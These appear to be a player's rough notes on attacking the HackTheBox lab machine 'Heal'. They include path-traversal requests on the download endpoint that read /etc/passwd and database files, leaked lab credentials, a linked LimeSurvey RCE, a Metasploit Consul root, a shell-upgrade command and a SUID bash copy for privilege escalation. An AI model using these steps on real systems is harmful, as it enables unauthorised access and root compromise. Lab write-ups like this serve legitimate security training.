___


# *express notes*

express is a web framework for node.js

app.use() # global middleware


function authRequest # this would b a custom middleware


app.get() # routes and request handlers


// Protected route with custom middleware
app.get('/admin', requireAuth, (req, res) => {
  res.send('Welcome to the admin panel!');
});

CORS -> Cross Origin Resource Sharing


CSP -> content security policy

*ENVS*
*development / staging / production*



# ralph appears to be a user on the machine



*this is where it sends data to*

      const url = isSignUp
        ? "http://api.heal.htb/signup"
        : "http://api.heal.htb/signin";



*api is a valid subdomain here*


http://api.heal.htb/signup
http://api.heal.htb/signin
http://api.heal.htb/profile
http://api.heal.htb/resume
/exports

http://api.heal.htb/download
# another subdomain wtf php?
http://take-survey.heal.htb/index.php/552933?lang=en



        <Route path="/profile" element={<Profile />} />
        <Route path="/resume" element={<ResumeForm />} />
        <Route path="/survey" element={<TakeSurvey />} />





*things to do*
-enumerate api dirs more or enumerate take-survery dirs more
-something with the export feature of the pdf file donwload and select files maybe fuck with that URL query params?
-find som vuln on the lime survey
-lime survey url query url parms?
-if i can get JWT secret I can forge it for admin prob
-its trying to connect to a websocket what is that about
-if i refresh network page I can see web socket conn attempts



*errors on console*

Firefox can’t establish a connection to the server at ws://heal.htb/sockjs-node/643/0lr31ue0/websocket.

*there are no cookies the password is being sent on every request*
Password fields present on an insecure ([http://](http:// "http://")) page. This is a security risk that allows user login credentials to be stolen.



*ralph is the admin ig*
Please contact Administrator ( ralph@heal.htb ) for further assistance.



*this subdomain is running lime survey open source tool*
http://take-survey.heal.htb/index.php

/admin page here


*there are creds if I can reach here*
http://take-survey.heal.htb/application/config/config.php

*direct script access is not allowed though*

*installation security hints*
https://www.limesurvey.org/manual/Installation_security_hints


*all the CVE's looks like I need to be authenticated either as admin or ralph probs maybe*

# JWT is signed and uses user id's if i can get that symetric key I can forge them



*web socket*



http://heal.htb/sockjs-node/info?t=1754525874025

http://heal.htb/sockjs-node/781/cswm2hss/xhr_streaming?t=1754525978728

ws://heal.htb/sockjs-node/781/ceqdzvmr/websocket


this might be the way here -> should not b live in prod



*some data sent from the dev server*
a["{\"type\":\"hot\"}"]
a["{\"type\":\"log-level\",\"data\":\"none\"}"]
a["{\"type\":\"hash\",\"data\":\"1cc6c4d7b26c571c326e\"}"]
a["{\"type\":\"warnings\",\"data\":[\"./src/components/ResumeForm.js\\nModule Warning (from ./node_modules/eslint-loader/index.js):\\n\\n  Line 18:10:  'error' is assigned a value but never used     no-unused-vars\\n  Line 23:15:  'response' is assigned a value but never used  no-unused-vars\\n\\n\"]}"]



http://api.heal.htb/ <- I did not try GET request here

- **Rails version:** 7.1.4
- **Ruby version:** ruby 3.3.5 (2024-09-03 revision ef084cc8f4) [x86_64-linux]




on download file -> filename parameter can be used to read files!!!!



*users*

ralph:x:1000:1000:ralph:/home/ralph:/bin/bash

postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

ron:x:1001:1001:,,,:/home/ron:/bin/bash



GET /download?filename=../../Gemfile -> this returns gemfile
so we are 2 dictories in from root of the project


*grab db path*
GET /download?filename=../../config/database.yml HTTP/1.1



*grabbed database here*
GET /download?filename=../../storage/development.sqlite3 HTTP/1.1


*pass for ralph*
147258369


does not log into ssh
*logs into limesurvey*
ralph:147258369



*lime survey version*
[LimeSurvey Community Edition](https://community.limesurvey.org) [Version 6.6.4]


*rce*
https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE



*limesurvey database conn*
return array(
	'components' => array(
		'db' => array(
			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
			'emulatePrepare' => true,
			'username' => 'db_user',
			'password' => 'AdmiDi0_pA$$w0rd',
			'charset' => 'utf8',
			'tablePrefix' => 'lime_',





*connect to db*

-> list all tables with \dt



*this pass worked for ron*
ron:AdmiDi0_pA$$w0rd

*ron owns this?*
/dev/pts/1




*who tf is running this*
http://localhost:3001/ -> ruby on rails -> api.heal.htb

*ralph is running this*
http://localhost:3000/ -> node/express -> heal.htb

*being served by nginx*
      ServerName take-survey.heal.htb
      DocumentRoot /var/www/limesurvey



*these????*
-rw-r--r-- 1 root root 6764 Sep 25  2021 /usr/share/postgresql-common/t/045_backup.t
-rw-r--r-- 1 root root 8015 Nov 25  2024 /usr/share/postgresql/14/man/man1/pg_basebackup.1.gz
-rw-r--r-- 1 root root 3035 Nov 25  2024 /usr/share/postgresql/14/man/man1/pg_verifybackup.1.gz



*okay found something*
http://localhost:8500/ui/server1/services


Consul v1.19.2


*found rce on it on metaspLoit ran module and got root*



*this works to upgrade shell kinda cool*
```
script /dev/null -c bash
```


*cool trick creates a bash shell with SUID set for root access at tmp*
```
      "args": ["bash", "-c", "cp /bin/bash /tmp/0xdf && chmod 6777 /tmp/0xdf"],
```


*run that with -p so it doesn't drop root privs*
```
ron@heal:/dev/shm$ /tmp/0xdf -p
```